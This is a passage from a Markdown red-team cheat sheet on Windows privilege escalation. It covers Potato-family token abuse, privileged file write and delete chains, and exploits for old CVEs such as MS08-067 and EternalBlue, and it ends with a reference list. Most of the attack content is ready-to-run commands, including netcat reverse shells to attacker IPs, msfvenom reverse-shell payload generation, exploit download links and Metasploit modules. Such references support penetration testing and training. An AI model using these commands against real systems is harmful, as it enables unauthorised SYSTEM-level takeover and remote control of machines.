  \ tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999\n\n# RoguePotato without running RogueOxidResolver locally. You should\
  \ run the RogueOxidResolver.exe on your remote machine. \n# Use this if you have fw restrictions.\nRoguePotato.exe -r 10.0.0.3\
  \ -e \"C:\\windows\\system32\\cmd.exe\"\n\n# RoguePotato all in one with RogueOxidResolver running locally on port 9999\n\
  RoguePotato.exe -r 10.0.0.3 -e \"C:\\windows\\system32\\cmd.exe\" -l 9999\n\n#RoguePotato all in one with RogueOxidResolver\
  \ running locally on port 9999 and specific clsid and custom pipename\nRoguePotato.exe -r 10.0.0.3 -e \"C:\\windows\\system32\\\
  cmd.exe\" -l 9999 -c \"{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}\" -p splintercode\n```\n\n### EFSPotato (MS-EFSR EfsRpcOpenFileRaw)\n\
  \n* Binary available at [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)\n\n```powershell\n# .NET 4.x\ncsc EfsPotato.cs\n\
  csc /platform:x86 EfsPotato.cs\n\n# .NET 2.0/3.5\nC:\\Windows\\Microsoft.Net\\Framework\\V3.5\\csc.exe EfsPotato.cs\nC:\\\
  Windows\\Microsoft.Net\\Framework\\V3.5\\csc.exe /platform:x86 EfsPotato.cs\n```\n\n### JuicyPotatoNG\n\n* [antonioCoco/JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG)\n\
  \n```powershell\nJuicyPotatoNG.exe -t * -p \"C:\\Windows\\System32\\cmd.exe\" -a \"/c whoami\" > C:\\juicypotatong.txt\n\
  ```\n\n### PrintSpoofer (Printer Bug)\n\n> this work if SeImpersonatePrivilege is enabled\n\n* Binary available at [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)\n\
  \n```powershell\n# run nc -lnvp 443 then :\n.\\PrintSpoofer64.exe -c \"C:\\Temp\\nc64.exe 192.168.45.171 443 -e cmd\"\n\
  # without listener\n.\\PrintSpoofer64.exe -i -c cmd\n# Via RPD\n.\\PrintSpoofer64.exe -d 3 -c \"powershell -ep bypass\"\n\
  ```\n\n## EoP - Privileged File Write\n\n### DiagHub\n\n:warning: Starting with version 1903 and above, DiagHub can no longer\
  \ be used to load arbitrary DLLs.\n\nThe Microsoft Diagnostics Hub Standard Collector Service (DiagHub) is a service that\
  \ collects trace information and is programmatically exposed via DCOM.\nThis DCOM object can be used to load a DLL into\
  \ a SYSTEM process, provided that this DLL exists in the `C:\\Windows\\System32` directory.\n\n#### Exploit\n\n1. Create\
  \ an [evil DLL](https://gist.github.com/xct/3949f3f4f178b1f3427fae7686a2a9c0) e.g: payload.dll and move it into `C:\\Windows\\\
  System32`\n2. Build [xct/diaghub](https://github.com/xct/diaghub)\n3. `diaghub.exe c:\\\\ProgramData\\\\ payload.dll`\n\n\
  The default payload will run `C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -lvp 2000 -e cmd.exe`\n\nAlternative\
  \ tools:\n\n* [Accenture/AARO-Bugs/CVE-2020-5825/TrigDiag](https://github.com/Accenture/AARO-Bugs/tree/master/CVE-2020-5825/TrigDiag)\n\
  * [decoder-it/diaghub_exploit](https://github.com/decoder-it/diaghub_exploit)\n\n### UsoDLLLoader\n\n:warning: 2020-06-06\
  \ Update: this trick no longer works on the latest builds of Windows 10 Insider Preview.\n\n> An alternative to the DiagHub\
  \ DLL loading \"exploit\" found by James Forshaw (a.k.a. @tiraniddo)\n\nIf we found a privileged file write vulnerability\
  \ in Windows or in some third-party software, we could copy our own version of `windowscoredeviceinfo.dll` into `C:\\Windows\\\
  Sytem32\\` and then have it loaded by the USO service to get arbitrary code execution as **NT AUTHORITY\\System**.\n\n####\
  \ Exploit\n\n1. Build [itm4n/UsoDllLoader](https://github.com/itm4n/UsoDllLoader)\n    * Select Release config and x64 architecure.\n\
  \    * Build solution.\n        * DLL .\\x64\\Release\\WindowsCoreDeviceInfo.dll\n        * Loader .\\x64\\Release\\UsoDllLoader.exe.\n\
  2. Copy `WindowsCoreDeviceInfo.dll` to `C:\\Windows\\System32\\`\n3. Use the loader and wait for the shell or run `usoclient\
  \ StartInteractiveScan` and connect to the bind shell on port 1337.\n\n### WerTrigger\n\n> Exploit Privileged File Writes\
  \ bugs with Windows Problem Reporting\n\n1. Clone [sailay1996/WerTrigger](https://github.com/sailay1996/WerTrigger)\n2.\
  \ Copy `phoneinfo.dll` to `C:\\Windows\\System32\\`\n3. Place `Report.wer` file and `WerTrigger.exe` in a same directory.\n\
  4. Then, run `WerTrigger.exe`.\n5. Enjoy a shell as **NT AUTHORITY\\SYSTEM**\n\n### WerMgr\n\n> Exploit Privileged Directory\
  \ Creation Bugs with Windows Error Reporting\n\n1. Clone [binderlabs/DirCreate2System](https://github.com/binderlabs/DirCreate2System)\n\
  2. Create directory `C:\\Windows\\System32\\wermgr.exe.local\\`\n3. Grant access to it: `cacls C:\\Windows\\System32\\wermgr.exe.local\
  \ /e /g everyone:f`\n4. Place `spawn.dll` file and `dircreate2system.exe` in a same directory and run `.\\dircreate2system.exe`.\n\
  5. Enjoy a shell as **NT AUTHORITY\\SYSTEM**\n\n## EoP - Privileged File Delete\n\nDuring an MSI installation, the Windows\
  \ Installer service maintains a record of every changes in case it needs to be rolled back, to do that it will create:\n\
  \n* a folder at `C:\\Config.Msi` containing\n    * a rollback script (`.rbs`)\n    * a rollback file (`.rbf`)\n\nTo convert\
  \ a privileged file delete to a local privilege escalation, you need to abuse the Windows Installer service.\n\n* delete\
  \ the protected `C:\\Config.Msi` folder immediately after it's created by the Windows Installer\n* recreate the `C:\\Config.Msi`\
  \ folder with weak DACL permissions since ordinary users are allowed to create folders at the root of `C:\\`.\n* drop malicious\
  \ `.rbs` and `.rbf` files into it to be executed by the MSI rollback\n* then upon rollback, Windows Installer will make\
  \ arbitrary changes to the system\n\nThe easiest way to trigger this chain is using [thezdi/FilesystemEoPs/FolderOrFileDeleteToSystem](https://github.com/thezdi/PoC/tree/master/FilesystemEoPs/FolderOrFileDeleteToSystem).\n\
  The exploit contains a .msi file with 2 actions, the first one produces a delay and the second throws an error to make it\
  \ rollback. This rollback will \"restore\" a malicious HID.dll in `C:\\Program Files\\Common Files\\microsoft shared\\ink\\\
  HID.dll`.\n\nThen switch to the secure desktop using `[CTRL]+[ALT]+[DELETE]` and open the On-Screen Keyboard (`osk.exe`).\n\
  The `osk.exe` process first looks for the `C:\\Program Files\\Common Files\\microsoft shared\\ink\\HID.dll` library instead\
  \ of `C:\\Windows\\System32\\HID.dll`\n\n## EoP - Common Vulnerabilities and Exposure\n\n### MS08-067 (NetAPI)\n\nCheck\
  \ the vulnerability with the following nmap script.\n\n```c\nnmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms08-067\
  \ <ip_netblock>\n```\n\nMetasploit modules to exploit `MS08-067 NetAPI`.\n\n```powershell\nexploit/windows/smb/ms08_067_netapi\n\
  ```\n\nIf you can't use Metasploit and only want a reverse shell.\n\n```powershell\nhttps://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py\n\
  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -b \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\\
  x2e\\x40\" -f py -v shellcode -a x86 --platform windows\n\nExample: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP\
  \ SP0/SP1 Universal, port 445\nExample: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445\
  \ could also be used)\nExample: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal\nExample: MS08_067_2018.py\
  \ 192.168.1.1 4 445 -- for Windows 2003 SP1 English\nExample: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French\
  \ (NX)\nExample: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)\nExample: MS08_067_2018.py 192.168.1.1\
  \ 7 445 -- for Windows XP SP3 English (AlwaysOn NX)\npython ms08-067.py 10.0.0.1 6 445\n```\n\n### MS10-015 (KiTrap0D) -\
  \ Microsoft Windows NT/2000/2003/2008/XP/Vista/7\n\n'KiTrap0D' User Mode to Ring Escalation (MS10-015)\n\n```powershell\n\
  https://www.exploit-db.com/exploits/11199\n\nMetasploit : exploit/windows/local/ms10_015_kitrap0d\n```\n\n### MS11-080 (afd.sys)\
  \ - Microsoft Windows XP/2003\n\n```powershell\nPython: https://www.exploit-db.com/exploits/18176\nMetasploit: exploit/windows/local/ms11_080_afdjoinleaf\n\
  ```\n\n### MS15-051 (Client Copy Image) - Microsoft Windows 2003/2008/7/8/2012\n\n```powershell\nprintf(\"[#] usage: ms15-051\
  \ command \\n\");\nprintf(\"[#] eg: ms15-051 \\\"whoami /all\\\" \\n\");\n\n# x32\nhttps://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/Win32/ms15-051.exe\n\
  \n# x64\nhttps://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/x64/ms15-051.exe\n\
  \nhttps://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051\nuse exploit/windows/local/ms15_051_client_copy_image\n\
  ```\n\n### MS16-032 - Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64)\n\nCheck if the patch is installed : `wmic qfe\
  \ list | findstr \"3139914\"`\n\n```powershell\nPowershell:\nhttps://www.exploit-db.com/exploits/39719/\nhttps://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1\n\
  \nBinary exe : https://github.com/Meatballs1/ms16-032\n\nMetasploit : exploit/windows/local/ms16_032_secondary_logon_handle_privesc\n\
  ```\n\n### MS17-010 (Eternal Blue)\n\nCheck the vulnerability with the following nmap script or netexec: `netexec smb 10.10.10.10\
  \ -u '' -p '' -d domain -M ms17-010`.\n\n```c\nnmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17–010 <ip_netblock>\n\
  ```\n\nMetasploit modules to exploit `EternalRomance/EternalSynergy/EternalChampion`.\n\n```powershell\nauxiliary/admin/smb/ms17_010_command\
  \          MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution\nauxiliary/scanner/smb/smb_ms17_010\
  \            MS17-010 SMB RCE Detection\nexploit/windows/smb/ms17_010_eternalblue      MS17-010 EternalBlue SMB Remote Windows\
  \ Kernel Pool Corruption\nexploit/windows/smb/ms17_010_eternalblue_win8 MS17-010 EternalBlue SMB Remote Windows Kernel Pool\
  \ Corruption for Win8+\nexploit/windows/smb/ms17_010_psexec           MS17-010 EternalRomance/EternalSynergy/EternalChampion\
  \ SMB Remote Windows Code Execution\n```\n\nIf you can't use Metasploit and only want a reverse shell.\n\n```powershell\n\
  git clone https://github.com/helviojunior/MS17-010\n\n# generate a simple reverse shell to use\nmsfvenom -p windows/shell_reverse_tcp\
  \ LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exe\npython2 send_and_execute.py\
  \ 10.0.0.1 revshell.exe\n```\n\n### CVE-2019-1388\n\nExploit : [packetstormsecurity/hhupd.exe](https://packetstormsecurity.com/files/14437/hhupd.exe.html)\n\
  \nRequirement:\n\n* Windows 7\n* Windows 10 LTSC 10240\n\nFailing on :\n\n* LTSC 2019\n* 1709\n* 1803\n\nDetailed information\
  \ about the vulnerability : [Thanksgiving Treat: Easy-as-Pie Windows 7 Secure Desktop Escalation of Privilege - Simon Zuckerbraun\
  \ - November 19, 2019](https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege)\n\
  \n## References\n\n* [ABUSING ARBITRARY FILE DELETES TO ESCALATE PRIVILEGE AND OTHER GREAT TRICKS - Simon Zuckerbraun -\
  \ March 17, 2022](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)\n\
  * [Abusing Diaghub - xct - March 7, 2019](https://vulndev.io/2019/03/06/abusing-diaghub/)\n* [Abusing SeLoadDriverPrivilege\
  \ for privilege escalation - June 14, 2018 - OSCAR MALLO](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)\n\
  * [Abusing the SeRelabelPrivilege - @decoder_it - May 30, 2024](https://decoder.cloud/2024/05/30/abusing-the-serelabelprivilege/)\n\
  * [Alternative methods of becoming SYSTEM - Adam Chester @_xpn_ - November 20, 2017](https://blog.xpnsec.com/becoming-system/)\n\
  * [Basic Linux Privilege Escalation - g0tmi1k - August 2, 2011](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\n\
  * [Bypassing AppLocker by abusing HashInfo - Ian - August 19, 2022](https://shells.systems/post-bypassing-applocker-by-abusing-hashinfo/)\n\
  * [Chapter 4 - Windows Post-Exploitation - dostoevskylabs - November 2, 2017](https://github.com/dostoevskylabs/dostoevsky-pentest-notes/blob/master/chapter-4.md)\n\
  * [Common Windows Misconfiguration: Services - 2018-09-23 - @am0nsec](https://web.archive.org/web/20191105182846/https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html)\n\
  * [Deleting Your Way Into SYSTEM: Why Arbitrary File Deletion Vulnerabilities Matter - ANDREW OLIVEAU - SEP 11, 2023](https://www.mandiant.com/resources/blog/arbitrary-file-deletion-vulnerabilities)\n\
  * [Escalating Privileges via Third-Party Windows Installers - ANDREW OLIVEAU - JUL 19, 2023](https://www.mandiant.com/resources/blog/privileges-third-party-windows-installers)\n\
  * [Giving JuicyPotato a second chance: JuicyPotatoNG - @decoder_it, @splinter_code](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)\n\
  * [Hacking Trick: Environment Variable $Path Interception y Escaladas de Privilegios para Windows](https://www.elladodelmal.com/2020/03/hacking-trick-environment-variable-path.html?m=1)\n\
  * [icacls - Docs Microsoft](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)\n* [IN\
  \ THE POTATO FAMILY, I WANT THEM ALL - @BlWasp_](https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all)\n\
  * [Living Off The Land Binaries and Scripts (and now also Libraries)](https://github.com/LOLBAS-Project/LOLBAS)\n* [Local\
  \ Privilege Escalation Workshop - Slides.pdf - @sagishahar](https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf)\n\
  * [MSI Shenanigans. Part 1 – Offensive Capabilities Overview - DECEMBER 8, 2022 - Mariusz Banach](https://mgeeky.tech/msi-shenanigans-part-1/)\n\
  * [MSIFortune - LPE with MSI Installers - Oct 3, 2023 - PfiatDe](https://badoption.eu/blog/2023/10/03/MSIFortune.html)\n\
  * [Pentestlab.blog - WPE-01 - Stored Credentials](https://pentestlab.blog/2017/04/19/stored-credentials/)\n* [Pentestlab.blog\
  \ - WPE-02 - Windows Kernel](https://pentestlab.blog/2017/04/24/windows-kernel-exploits/)\n* [Pentestlab.blog - WPE-03 -\
  \ DLL Injection](https://pentestlab.blog/2017/04/04/dll-injection/)\n* [Pentestlab.blog - WPE-04 - Weak Service Permissions](https://pentestlab.blog/2017/03/30/weak-service-permissions/)\n\
  * [Pentestlab.blog - WPE-05 - DLL Hijacking](https://pentestlab.blog/2017/03/27/dll-hijacking/)\n* [Pentestlab.blog - WPE-06\
  \ - Hot Potato](https://pentestlab.blog/2017/04/13/hot-potato/)\n* [Pentestlab.blog - WPE-07 - Group Policy Preferences](https://pentestlab.blog/2017/03/20/group-policy-preferences/)\n\
  * [Pentestlab.blog - WPE-08 - Unquoted Service Path](https://pentestlab.blog/2017/03/09/unquoted-service-path/)\n* [Pentestlab.blog\
  \ - WPE-09 - Always Install Elevated](https://pentestlab.blog/2017/02/28/always-install-elevated/)\n* [Pentestlab.blog -\
  \ WPE-10 - Token Manipulation](https://pentestlab.blog/2017/04/03/token-manipulation/)\n* [Pentestlab.blog - WPE-11 - Secondary\
  \ Logon Handle](https://pentestlab.blog/2017/04/07/secondary-logon-handle/)\n* [Pentestlab.blog - WPE-12 - Insecure Registry\
  \ Permissions](https://pentestlab.blog/2017/03/31/insecure-registry-permissions/)\n* [Pentestlab.blog - WPE-13 - Intel SYSRET](https://pentestlab.blog/2017/06/14/intel-sysret/)\n\
  * [Potatoes - Windows Privilege Escalation - Jorge Lajara - November 22, 2020](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)\n\
  * [Privilege Escalation Windows - Philip Linghammar](https://web.archive.org/web/20191231011305/https://xapax.gitbooks.io/security/content/privilege_escalation_windows.html)\n\
  * [Remediation for Microsoft Windows Unquoted Service Path Enumeration Vulnerability - September 18th, 2016 - Robert Russell](https://www.tecklyfe.com/remediation-microsoft-windows-unquoted-service-path-enumeration-vulnerability/)\n\
  * [The Open Source Windows Privilege Escalation Cheat Sheet by amAK.xyz and @xxByte](https://addaxsoft.com/wpecs/)\n* [The\
  \ SYSTEM Challenge](https://decoder.cloud/2017/02/21/the-system-challenge/)\n* [TOP–10 ways to boost your privileges in\
  \ Windows systems - hackmag](https://hackmag.com/security/elevating-privileges-to-administrative-and-further/)\n* [Universal\
  \ Privilege Escalation and Persistence – Printer - AUGUST 2, 2021)](https://pentestlab.blog/2021/08/02/universal-privilege-escalation-and-persistence-printer/)\n\
  * [Weaponizing Privileged File Writes with the USO Service - Part 2/2 - itm4n - August 19, 2019](https://itm4n.github.io/usodllloader-part2/)\n\
  * [Webinar - Windows Client Privilege Escalation - Oddvar Moe - March 26, 2025](https://www.youtube.com/watch?v=EG2Mbw2DVnU)\n\
  * [Windows Client Privilege Escalation-Shared.pptx - Oddvar Moe - March 27, 2025](https://fr.slideshare.net/slideshow/windows-client-privilege-escalation-shared-pptx/277239036)\n\
  * [Windows elevation of privileges - Guifre Ruiz](https://guif.re/windowseop)\n* [Windows Exploitation Tricks: Exploiting\
  \ Arbitrary File Writes for Local Elevation of Privilege - James Forshaw, Project Zero - Wednesday, April 18, 2018](https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html)\n\
  * [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)\n* [Windows Privilege Escalation\
  \ Guide - absolomb's security blog](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)"
_relative_path: redteam/escalation/windows-privilege-escalation.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/escalation/windows-privilege-escalation.md
````
